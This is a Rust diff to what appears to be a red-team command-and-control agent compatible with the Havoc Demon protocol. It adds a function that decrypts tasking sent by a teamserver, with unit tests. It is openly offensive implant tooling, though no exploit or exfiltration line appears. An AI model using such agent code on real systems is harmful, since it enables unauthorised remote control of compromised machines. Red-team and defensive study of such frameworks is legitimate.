@@ -4,8 +4,8 @@
 //! responses, matching the Havoc Demon wire format byte-for-byte.
 
 use red_cell_common::crypto::{
-    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, encrypt_agent_data,
-    encrypt_agent_data_at_offset,
+    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, decrypt_agent_data_at_offset,
+    encrypt_agent_data, encrypt_agent_data_at_offset,
 };
 use red_cell_common::demon::{DemonCommand, DemonEnvelope};
 
@@ -168,6 +168,52 @@ pub fn parse_init_ack(
     Ok(red_cell_common::crypto::ctr_blocks_for_len(response_body.len()))
 }
 
+/// Decrypted tasking bytes returned from a callback response.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct TaskingResponse {
+    /// Raw decrypted tasking bytes.
+    pub decrypted: Vec<u8>,
+    /// The next receive-side CTR block offset after consuming this response.
+    pub next_recv_ctr_offset: u64,
+}
+
+/// Decrypt a callback response and calculate the next receive CTR block offset.
+///
+/// The teamserver may return either a full Demon envelope or only the encrypted
+/// payload body. This parser accepts either form and returns the raw decrypted
+/// bytes for command dispatch.
+pub fn parse_tasking_response(
+    agent_id: u32,
+    crypto: &AgentCryptoMaterial,
+    recv_ctr_offset: u64,
+    response_body: &[u8],
+) -> Result<TaskingResponse, SpecterError> {
+    if response_body.is_empty() {
+        return Ok(TaskingResponse {
+            decrypted: Vec::new(),
+            next_recv_ctr_offset: recv_ctr_offset,
+        });
+    }
+
+    let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
+        Ok(envelope) => {
+            if envelope.header.agent_id != agent_id {
+                return Err(SpecterError::InvalidResponse("task envelope agent_id mismatch"));
+            }
+            envelope.payload
+        }
+        Err(_) => response_body.to_vec(),
+    };
+
+    let decrypted =
+        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &encrypted_payload)?;
+
+    Ok(TaskingResponse {
+        decrypted,
+        next_recv_ctr_offset: recv_ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
+    })
+}
+
 /// Serialize the init metadata fields to a big-endian byte buffer for encryption.
 fn serialize_init_metadata(agent_id: u32, m: &AgentMetadata) -> Vec<u8> {
     let mut buf = Vec::with_capacity(256);
@@ -234,7 +280,9 @@ pub fn ctr_blocks_for_len(byte_len: usize) -> u64 {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use red_cell_common::crypto::{decrypt_agent_data, generate_agent_crypto_material};
+    use red_cell_common::crypto::{
+        decrypt_agent_data, encrypt_agent_data_at_offset, generate_agent_crypto_material,
+    };
     use red_cell_common::demon::DEMON_MAGIC_VALUE;
 
     fn test_metadata() -> AgentMetadata {
@@ -432,5 +480,47 @@ mod tests {
         // First 4 bytes = size (BE), which equals total_len - 4
         let declared_size = u32::from_be_bytes(packet[0..4].try_into().expect("size"));
         assert_eq!(declared_size as usize, packet.len() - 4);
+    }
+
+    #[test]
+    fn parse_tasking_response_decrypts_raw_body_and_advances_recv_ctr() {
+        let crypto = generate_agent_crypto_material().expect("keygen");
+        let agent_id = 0x1357_2468;
+        let recv_ctr_offset = 5;
+        let plaintext = b"queued-tasking".to_vec();
+        let encrypted =
+            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
+                .expect("encrypt");
+
+        let response =
+            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &encrypted).expect("parse");
+
+        assert_eq!(response.decrypted, plaintext);
+        assert_eq!(
+            response.next_recv_ctr_offset,
+            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
+        );
+    }
+
+    #[test]
+    fn parse_tasking_response_decrypts_enveloped_body_and_advances_recv_ctr() {
+        let crypto = generate_agent_crypto_material().expect("keygen");
+        let agent_id = 0x2468_1357;
+        let recv_ctr_offset = 9;
+        let plaintext = b"command-stream".to_vec();
+        let encrypted =
+            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
+                .expect("encrypt");
+        let envelope = DemonEnvelope::new(agent_id, encrypted.clone()).expect("envelope");
+
+        let response =
+            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &envelope.to_bytes())
+                .expect("parse");
+
+        assert_eq!(response.decrypted, plaintext);
+        assert_eq!(
+            response.next_recv_ctr_offset,
+            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
+        );
     }
 }
